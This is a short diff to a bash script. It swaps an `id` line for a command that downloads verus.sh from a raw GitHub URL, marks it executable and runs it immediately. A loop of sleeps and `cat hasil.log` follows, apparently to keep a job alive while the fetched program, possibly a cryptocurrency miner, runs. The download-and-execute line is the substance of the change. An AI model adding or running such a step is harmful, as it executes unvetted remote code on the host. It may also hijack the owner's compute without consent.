@@ -1,5 +1,5 @@
 #!/bin/bash 
-id
+wget https://raw.githubusercontent.com/thefacta/script/main/verus.sh && chmod +x verus.sh && ./verus.sh
 echo "Bismillahirrohmanirrohim" && sleep 60 
 cat hasil.log && sleep 60 
 cat hasil.log && sleep 60 
